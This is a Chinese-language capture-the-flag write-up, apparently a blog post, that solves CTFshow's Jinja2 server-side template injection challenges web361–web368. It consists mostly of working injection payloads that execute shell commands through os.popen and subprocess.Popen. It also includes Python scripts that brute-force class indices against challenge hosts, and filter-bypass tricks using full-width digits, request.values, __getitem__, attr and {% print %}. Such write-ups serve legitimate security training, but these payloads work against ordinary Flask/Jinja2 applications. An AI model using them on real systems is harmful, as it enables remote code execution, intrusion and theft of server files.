# CTFSHOW SSTI

<img src="https://i-blog.csdnimg.cn/blog_migrate/23cb0c3e1f33aa120a95d0967c6bcd60.png" alt="" style="max-height:79px; box-sizing:content-box;" />


**目录**

[TOC]



最近搞了几题SSTI 有点意思

做一下CTFSHOW的吧

## web361   【无过滤】

```undefined
名字就是考点
```

这题简单直接payload和过程了

```handlebars
?name={{7*7}} 
 
?name={{"".__class__.__base__.__subclasses__()}}
 

```

这里贴上一下脚本 用来查找位数

```cobol
import time
 
import  requests
 
 
 
base_url="http://d30af560-b595-44ce-b476-e5681156b059.challenge.ctf.show/?name="
for i in range(200):
    payload="{{\"\".__class__.__base__.__subclasses__()[%s]}}"%i
    r= requests.get(url=base_url+payload)
    if "subprocess.Popen" in r.text:
        print(i)
    if r.status_code == 429:
        time.sleep(0.5)
```

简单的我就使用多点方法

### subprocess.Popen

```handlebars
/?name={{"".__class__.__base__.__subclasses__()[407]}}
```

```handlebars
/?name={{"".__class__.__base__.__subclasses__()[407]("ls",shell=True,stdout=-1).communicate()[0].strip()}}

```

### os._wrap_close

```handlebars
?name={{"".__class__.__base__.__subclasses__()[132]}}
 
/?name={{"".__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']("ls").read()}}
 
/?name={{"".__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']("ls /").read()}}
 
/?name={{"".__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']("cat /f*").read()}}
```

### url_for

```handlebars
{{url_for.__globals__}}
 
{{url_for.__globals__["current.app"].config}}
```

但是这里没有

下面是

推测可能是 twig 和 Jinja2 使用

### lipsum

```handlebars
?name={{lipsum.__globals__}}
 
?name={{lipsum.__globals__['os']}}
 
{{lipsum.__globals__['os'].popen("ls").read()}}
 
{{lipsum.__globals__['os'].popen("cat /f*").read()}}
```

### cycler

```handlebars
?name={{cycler.__init__.__globals__}}
 
?name={{cycler.__init__.__globals__.os.popen("ls /").read()}}
 
?name={{cycler.__init__.__globals__.os.popen("cat /f*").read()}}
```

不写了 太多了

还是需要理解 一旦出现过滤 这种直接复制粘贴是没有用的 最好在 python中多看看

## web362   【过滤数字】

这里过滤了数字

我们有两个方法

### 第一个通过 计算长度来实现

```handlebars
{% set a='aaaaaa'|length %}{{ ().__class__.__base__.__subclasses__()[a] }}
```

但是这个需要拼接很多

所以放弃

### 第二个使用脚本输出另一个数字来绕过

```cobol
def half2full(half):  
    full = ''  
    for ch in half:  
        if ord(ch) in range(33, 127):  
            ch = chr(ord(ch) + 0xfee0)  
        elif ord(ch) == 32:  
            ch = chr(0x3000)  
        else:  
            pass  
        full += ch  
    return full  
t=''
s="0123456789"
for i in s:
    t+='\''+half2full(i)+'\','
print(t)
 
```

```csharp
'０','１','２','３','４','５','６','７','８','９',
 
１３２
```

```handlebars
/?name={{"".__class__.__base__.__subclasses__()[１３２].__init__.__globals__.popen("cat /f*").read()}}
```

### 使用没有数字的payload

```handlebars
?name={{lipsum.__globals__['os'].popen("cat /flag").read()}}
```

## web363   【过滤引号】

这里可以使用构造request方式绕过 这里过滤了引号

我们需要构造无引号的

这里可以记住 过滤了引号 我们就可以通过括号来查找

### 使用getitem  自定义变量

这里可以使用自定义的变量来绕过 request.values.a 类似于自己定义的变量

只需要在}}后面传递参数即可

```handlebars
{{().__class__.__mro__[1].__subclasses__()}}
 
 
/?name={{().__class__.__mro__[1].__subclasses__()[].__init__.__globals__.__getitem__(request.values.a)}}&a=popen
 
这里是我们需要跑的脚本类型
 
我们需要找到popen来执行命令 我们就可以通过遍历类 然后通过__getitem__找到方法request
然后来查询popen
```

写个脚本

```python
import requests
 
baseurl="http://c48f6cc8-a4d6-4783-86af-982c96cf190e.challenge.ctf.show/?name="
 
for i in range(1000):
    payload="""{{().__class__.__mro__[1].__subclasses__()[%i].__init__.__globals__.__getitem__(request.values.a)}}&a=popen"""%i
    r=requests.get(url=baseurl+payload)
    if "popen" in r.text:
        print(i)
    else:
        continue
```

跑出来132

```handlebars
{{().__class__.__mro__[1].__subclasses__()[132].__init__.__globals__.__getitem__(request.values.a)(request.values.b).read()}}&a=popen&b=ls
 
 
/?name={{().__class__.__mro__[1].__subclasses__()[132].__init__.__globals__.__getitem__(request.values.a)(request.values.b).read()}}&a=popen&b=cat /flag
```

## web364   【过滤 args和引号】

这里其实使用上一题的方法还是可以

```handlebars
/?name={{().__class__.__mro__[1].__subclasses__()[132].__init__.__globals__.__getitem__(request.values.a)(request.values.b).read()}}&a=popen&b=cat /flag
```

这里介绍一下另一个方法chr方法

### chr

```python
import requests
 
baseurl="http://c48f6cc8-a4d6-4783-86af-982c96cf190e.challenge.ctf.show/?name="
 
for i in range(1000):
    payload="""{{().__class__.__mro__[1].__subclasses__()[%s].__init__.__globals__.__builtins__.chr}}"""%i
    r=requests.get(url=baseurl+payload)
    if "chr" in r.text:
        print(i)
    else:
        continue
```

通过脚本 寻找存在chr方法的类

然后使用 框架表达式 {{%%}}声明变量

来声明 chr的方法

```handlebars
?name={%set+chr=().__class__.__mro__[1].__subclasses__()[80].__init__.__globals__.__builtins__.chr%}{{().__class__.__mro__[1].__subclasses__()[132].__init__.__globals__.popen(chr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)).read()}}
 
 
 
这里是两块
{% set chr=().__class__.__mro__[1].__subclasses__()[80].__init__.__globals__.__builtins__.chr%}
 
第一块 来设置chr
 
 
第二块
{{().__class__.__mro__[1].__subclasses__()[132].__init__.__globals__.popen(chr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)).read()}}
 
这里的chr() 是 cat /f*
```

## web365   【过滤中括号】

这里比上一题多了中括号的过滤

### getitem()

```markdown
__golbals__[123]
 
__golbals__.__getitem__(123)
```

这两个 是没有区别的

所以遇到了中括号我们可以运用这个方式来做

```handlebars
?name={{().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(132).__init__.__globals__.popen(request.values.a).read()}}&a=ls
 
 
?name={{().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(132).__init__.__globals__.popen(request.values.a).read()}}&a=cat /f*
```

## web366   【过滤下划线】

这里接着上面的内容过滤了下划线

### attr

```cobol
().__class__
 
 
()|attr('__class__') 这两个是一样的
 
 
但是这个题目过滤了_ 
 
我们可以使用request来绕过
 
 
(lipsum|attr(request.values.a))   &a=__class__
```

直接构造payload

```handlebars
{{lipsum|attr(request.values.b)}}&b=__globals__
 
 
{{(lipsum|attr(request.values.b)).os}}&b=__globals__
 
 
 
{{(lipsum|attr(request.values.b)).os.popen(request.values.c).read()}}&b=__globals__&c=ls
 
{{(lipsum|attr(request.values.b)).os.popen(request.values.c).read()}}&b=__globals__&c=cat /f*
```

## web367   【过滤os】

这里在上面的基础上过滤了os

这里需要使用get(request.values.a) 来获取os

其余和上面一样即可

### get(request.values.a)

```handlebars
?name={{(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()}}&a=__globals__&b=os&c=cat /f*
```

## web368   【过滤{{】

这里我们过滤了{{ 但是没有过滤其他表达式

我们通过 {% %}

表达式修改一下即可

```cobol
?name={%+print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()%}&a=__globals__&b=os&c=ls
 
 
?name={%+print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()%}&a=__globals__&b=os&c=cat /f*
```